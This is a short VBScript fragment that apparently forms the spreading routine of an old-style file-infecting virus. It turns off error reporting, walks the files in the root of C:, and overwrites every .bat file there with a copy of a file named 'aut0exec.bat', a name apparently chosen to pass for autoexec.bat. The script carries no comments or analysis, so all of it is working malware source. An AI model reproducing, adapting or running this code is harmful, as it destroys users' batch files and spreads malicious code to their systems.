on error resume next
Set fso = CreateObject("Scripting.FileSystemObject")
eee = "c:\aut0exec.bat"
Set f = fso.GetFolder("c:\")
Set fc = f.Files
For Each f1 In fc
ext = fso.GetExtensionName(f1.Path)
ext = LCase(ext)
If (ext = "bat") Then
Set f = fso.getfile(eee)
f.Copy (f1.Path)
End If
Next
